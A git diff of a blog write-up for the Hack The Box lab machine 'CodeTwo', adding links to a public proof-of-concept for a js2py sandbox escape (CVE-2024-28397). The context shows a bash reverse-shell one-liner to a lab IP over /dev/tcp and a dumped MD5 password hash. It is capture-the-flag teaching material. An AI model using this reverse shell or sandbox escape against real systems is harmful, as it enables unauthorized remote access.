@@ -6,11 +6,8 @@ image:
 layout: post
 media_subpath: /assets/posts/2025-08-22-htb-codetwo
 categories: [Linux, HTB-Easy]
-tags: [HTB, HTB_Medium, Flask, js2py, CVE-2024-28397, Sandbox-Escape, SQLite, Credential-Cracking, npbackup, Sudo-Misconfiguration, Reverse-Shell, Linux]
+tags: [HTB, HTB_Easy, js2py, CVE-2024-28397, Sandbox-Escape, SQLite, Credential-Cracking, npbackup, Sudo-Misconfiguration, Reverse-Shell, Linux]
 description: "CodeTwo is a easy difficulty Linux machine on HTB that demonstrates the risks of insecure dependencies and misconfigured backup tools. By exploiting a vulnerable js2py sandbox (CVE-2024-28397), attackers can gain RCE through the web dashboard. From there, weakly hashed SQLite credentials enable lateral movement into the Marco account. Finally, abuse of npbackup-cli with sudo privileges allows escalation to root. This machine teaches players about dependency exploits, credential cracking, and privilege escalation through misconfigured backup utilities."
----
-Perfect — here’s your enhanced writeup with a **Language Table** added at the end to summarize the attack paths in a quick-reference format.
-
 ---
 
 # Hack The Box — CodeTwo Writeup
@@ -65,13 +62,13 @@ flask-sqlalchemy==3.1.1
 js2py==0.74
 ```
 
-The vulnerable library **js2py (v0.74)** was confirmed to be affected by **CVE-2024-28397**, a sandbox escape leading to arbitrary Python execution.
+The vulnerable library **js2py (v0.74)** was confirmed to be affected by **[CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)**, a sandbox escape leading to arbitrary Python execution.
 
 ---
 
 ## Exploitation — Remote Code Execution
 
-Using a modified PoC payload, a reverse shell was injected via the dashboard code execution panel:
+Using a modified [PoC](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py) payload, a reverse shell was injected via the dashboard code execution panel:
 
 ```javascript
 let cmd = "bash -c 'exec bash -i &>/dev/tcp/10.10.14.12/1234 <&1'"
@@ -114,7 +111,7 @@ ssh app@10.10.11.82
 
 ## App User → Marco
 
-Dumping the SQLite `users.db` revealed credentials:
+Dumping the SQLite `users.db` in the `instance` folder revealed credentials:
 
 ```sql
 1|marco|649c9d65a206a75f5abe509fe128bce5
